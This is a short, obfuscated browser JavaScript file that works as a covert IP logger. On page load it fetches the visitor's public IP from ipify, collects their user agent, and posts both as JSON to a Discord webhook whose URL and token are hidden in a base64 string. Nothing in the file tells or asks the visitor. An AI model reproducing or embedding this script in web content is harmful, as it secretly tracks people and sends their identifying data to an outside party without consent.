const aaa = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NTI5NTUyOTc1NjAwNDQyNi9JNGVmS1FGOHVJSUFSbEgzN090ZGNLZXJkdi1GZ0pGOXJhSE5VdjVzLW4wei11RHE3ay1WOF9ZWEM4NTFNeVVnejhsZA==';
const bbb = atob(aaa);

function ccc() {
  let ddd = {
    ipAddress: null,
    userAgent: navigator.userAgent,
  };
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      ddd.ipAddress = data.ip;
      sss(ddd);
    })
}
function sss(ddd) {
  fetch(bbb, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      content: `\`\`\`
${JSON.stringify(ddd, null, 2)}
\`\`\``
    })
  });
}
ccc();
